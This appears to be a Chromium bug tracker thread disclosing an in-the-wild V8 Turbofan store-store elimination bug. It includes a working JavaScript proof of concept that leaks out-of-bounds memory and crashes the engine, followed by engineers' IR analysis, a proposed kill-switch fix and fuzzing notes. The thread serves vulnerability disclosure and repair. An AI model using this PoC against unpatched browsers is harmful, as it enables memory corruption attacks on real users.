Descriptionbs...@google.com created issue #1
May 27, 2025 09:29PM
Vulnerability details
NOTE: Google Threat Analysis Group has evidence that the following bug is being used in the wild. Therefore, this bug is subject to Google's 7 day disclosure deadline.

An arbitrary read/write within the V8 sandbox is possible via a bug in Turbofan.

Version
V8 at commit 610337a26087a854db49f7ab2346d64881ef6150 (May 23 2025)

Reproduction case
The following poc.js will leak data out of bounds and trigger a crash:

let ab = new ArrayBuffer(256);
let dv = new DataView(ab);  

function ftoi(t) {
  dv.setFloat64(0, t, true);
  return dv.getUint32(0, true) + dv.getUint32(4, true) * 0x100000000;
}

console.log('Leak memory');
function foo(i) {
  let a = [1.1, 1.1, 1.1];
  a[0] = a[i];
  return a[0];
}

let x;
while (true) {
  x = foo('0');
  if (x != 1.1) break;
}
console.log("x =", x, "=", "0x"+ftoi(x).toString(16));

console.log('Trigger crash');
function bar(i) {
  let a = [1.1, {}, 1.1];
  a[0] = a[i];
}

while (true) {
  bar('0');
}

le...@chromium.org<le...@chromium.org> #5May 28, 2025 12:50AM
This is a store-store elimination issue. Store-store elimination is transforming

  111: Allocate(#8)[Young, tagged aligned]
  112: Store *(#111) = #9 [tagged base, TaggedPointer, NoWriteBarrier, initializing]
  113: Store *(#111 + 4) = #18 [tagged base, TaggedSigned, NoWriteBarrier, offset: 4, initializing]
  115: Store *(#111 + 8) = #11 [tagged base, Float64, NoWriteBarrier, offset: 8, initializing]
  116: Store *(#111 + 16) = #11 [tagged base, Float64, NoWriteBarrier, offset: 16, initializing]
  118: Store *(#111 + 24) = #11 [tagged base, Float64, NoWriteBarrier, offset: 24, initializing]
  119: Load *(#111 + 8 + #76*8) [tagged base, Float64, Float64, element size: 2^3, offset: 8]
  121: FloatUnary(#119)[SilenceNaN, Float64]
  122: Comparison(#121, #11)[Equal, Float64]
  123: Store *(#111 + 8) = #121 [tagged base, Float64, NoWriteBarrier, offset: 8]
to

  105: Allocate(#8)[Young, tagged aligned]
  106: Store *(#105) = #9 [tagged base, TaggedPointer, NoWriteBarrier, initializing]
  107: Store *(#105 + 4) = #16 [tagged base, TaggedSigned, NoWriteBarrier, offset: 4, initializing]
  109: Store *(#105 + 16) = #11 [tagged base, Float64, NoWriteBarrier, offset: 16, initializing]
  110: Store *(#105 + 24) = #11 [tagged base, Float64, NoWriteBarrier, offset: 24, initializing]
  112: Load *(#105 + 8 + #72*8) [tagged base, Float64, Float64, element size: 2^3, offset: 8]
  113: FloatUnary(#112)[SilenceNaN, Float64]
  114: Comparison(#113, #11)[Equal, Float64]
  115: Store *(#105 + 8) = #113 [tagged base, Float64, NoWriteBarrier, offset: 8]
Notice the last store #123 in the top block makes the #115 store "redundant", if not for the indexed load in between (in the case when #76 has the value 0).

It looks like this load is ignored because the stores are treated as field stores (since they have an offset but don't have an index), but the load is treated as an element load (since it does have an index), so they're assumed not to alias. The index appears to be removed somewhere in the machine optimizer, because a statically known index can be folded into the offset. I'm guessing that the string-to-number conversion in array["0"] is smuggling the index past this optimisation for the load.

We can kill-switch disable the entire Store-Store Optimisation for a quick fix, followed by resolving the aliasing issue in some better way.

sa...@google.com<sa...@google.com> #12May 28, 2025 05:37PM
Some very early thoughts about why our fuzzers didn't find this even thought the sample is quite simple: it seems like this testcase requires --verify-heap since it creates an invalid JSArray but doesn't use it in a way that would cause memory corruption directly. Instead, it relies on --verify-heap to find the broken object during garbage collection and heap verification. I've verified that our fuzzbuild also crashes with this testcase and --verify-heap. However, on that build it takes >3 seconds to trigger, so on our fuzzing instances we'd run into a timeout way before that (we use a 500ms timeout). So that may be one reason why we didn't find this earlier.

Somewhat of an alternative repro (which doesn't need string-to-number weirdness, but is just a correctness issue and not a security one, and would be hard to turn into a security issue I think):

function foo(i) {
  let arr = [1, 2, i, 4, 5];
  arr[i]; // Will insert checks that {i} is in bounds.
  arr[1] = 42; // First store, will be (wrongly) store-store eliminated
  let v = arr[i]; // Load at offset 1 (should read 42)
  arr[1] = 4; // Second store, will allow the 1st one to be (wongly) eliminated
  return v;
}

%PrepareFunctionForOptimization(foo);
print(foo(1));
print(foo(1));

%OptimizeFunctionOnNextCall(foo);
print(foo(1));
This prints 2 after optimization instead of 42. Only a correctness issue and not a crash, so not easy to Fuzzilli to spot. But could be useful with differential fuzzing, if we have some fuzzers running with and without --store-store-elimination.
